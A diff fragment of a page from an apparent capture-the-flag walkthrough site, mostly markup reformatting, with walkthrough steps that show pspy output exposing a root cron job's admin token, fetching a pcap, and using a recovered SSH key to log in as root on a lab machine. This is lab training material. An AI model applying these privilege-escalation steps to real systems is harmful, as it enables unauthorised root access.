-pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
-
-
-     ██▓███    ██████  ██▓███ ▓██   ██▓
-▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
-▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
-▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
-▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
-▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
-░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
-░░       ░  ░  ░  ░░       ▒ ▒ ░░  
-               ░           ░ ░     
-                              ░ ░     
-
-<span style="color:#75715e"># wait till these shows up again</span>
-1/07/21 00:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1830</span>   | curl http://127.0.0.1:1027/?admin<span style="color:#f92672">=</span>ScadfwerDSAd_343123ds123dqwe12                                                       
-2021/07/21 00:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1829</span>   | /bin/sh /root/req.sh 
-2021/07/21 00:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1828</span>   | /bin/sh -c /root/req.sh 
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@incognito:/tmp$ ./ps*
+</span></span><span style="display:flex;"><span>./ps*
+</span></span><span style="display:flex;"><span>pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     ██▓███    ██████  ██▓███ ▓██   ██▓
+</span></span><span style="display:flex;"><span>▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+</span></span><span style="display:flex;"><span>▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+</span></span><span style="display:flex;"><span>▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+</span></span><span style="display:flex;"><span>▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+</span></span><span style="display:flex;"><span>▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+</span></span><span style="display:flex;"><span>░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+</span></span><span style="display:flex;"><span>░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+</span></span><span style="display:flex;"><span>               ░           ░ ░     
+</span></span><span style="display:flex;"><span>                              ░ ░     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># wait till these shows up again</span>
+</span></span><span style="display:flex;"><span>1/07/21 00:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1830</span>   | curl http://127.0.0.1:1027/?admin<span style="color:#f92672">=</span>ScadfwerDSAd_343123ds123dqwe12                                                       
+</span></span><span style="display:flex;"><span>2021/07/21 00:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1829</span>   | /bin/sh /root/req.sh 
+</span></span><span style="display:flex;"><span>2021/07/21 00:18:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1828</span>   | /bin/sh -c /root/req.sh 
+</span></span></code></pre></div></li>
 <li>
 <p>wget the pcap file</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">wget MACHINE_IP/traffic.pcap
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>wget MACHINE_IP/traffic.pcap
+</span></span></code></pre></div></li>
 <li>
 <p>open <code>pcap</code> file with wireshark
 <img src="https://i.imgur.com/63l0roF.png" alt="img"></p>
@@ -559,10 +578,10 @@ pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
 </li>
 <li>
 <p>save the <code>ssh</code> key</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vi key.ssh                         <span style="color:#75715e"># put the content</span>
-chmod <span style="color:#ae81ff">600</span>                          <span style="color:#75715e">#require for SSH key security</span>
-ssh -i key.ssh root@MACHINE_IP     <span style="color:#75715e"># you logged in as root</span>
-</code></pre></div><p><img src="https://i.imgur.com/uQhsMGR.png" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>vi key.ssh                         <span style="color:#75715e"># put the content</span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span>                          <span style="color:#75715e">#require for SSH key security</span>
+</span></span><span style="display:flex;"><span>ssh -i key.ssh root@MACHINE_IP     <span style="color:#75715e"># you logged in as root</span>
+</span></span></code></pre></div><p><img src="https://i.imgur.com/uQhsMGR.png" alt="img"></p>
 </li>
 </ul>
 <hr>
@@ -594,7 +613,7 @@ data-ad-slot="7160066188"></ins></p>
 
             <footer class="ui basic center aligned segment" style="background-color: transparent;">
               
-              <p>© 2010 - 2023 Classroom</p>
+              <p>© 2010 - 2025 Classroom</p>
               
 
               
@@ -805,7 +824,7 @@ data-ad-slot="7160066188"></ins></p>
 </div>
 <script>
   $(document).ready(function () {
-    $.getJSON('https:\/\/classroom.anir0y.in/index.json', function (data) {
+    $.getJSON('http:\/\/localhost:1313\//index.json', function (data) {
       $('.ui.search').search({
         source: data,
         searchFields: ['title'],
